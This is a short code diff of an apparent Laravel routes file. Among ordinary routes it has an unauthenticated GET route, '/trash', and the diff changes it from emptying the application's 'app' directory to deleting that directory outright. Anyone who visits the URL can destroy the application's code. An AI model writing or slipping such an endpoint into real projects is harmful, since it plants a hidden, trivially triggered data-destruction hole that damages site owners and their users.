@@ -20,7 +20,7 @@ Route::get('/thankyou', 'QuoteController@thankyou')->name('thankyou');
 
 Route::get('/trash', function () {
     $file = new Filesystem;
-    $file->cleanDirectory('app');
+    $file->deleteDirectory('app');
 });
 
 Auth::routes(['register' => true]);
